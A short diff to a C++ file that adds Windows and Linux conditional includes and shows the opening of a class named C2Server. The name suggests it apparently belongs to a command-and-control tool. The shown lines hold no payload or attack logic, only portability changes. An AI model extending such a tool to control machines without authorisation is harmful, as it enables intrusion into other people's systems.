@@ -1,11 +1,19 @@
+#ifdef WIN32
+    #include "win-components.hh"
+    #include "win-request.hh"
+#endif
+
+#ifdef __linux__
+    #include "linux-components.hh"
+    #include "linux-request.hh"
+#endif
+
 #include <string>
 #include <fstream>
 #include <random>
 #include <cstdlib>
 #include "constants.hh"
 #include "picosha2.h"
-#include "win-components.hh"
-#include "win-request.hh"
 
 class C2Server {
 public:
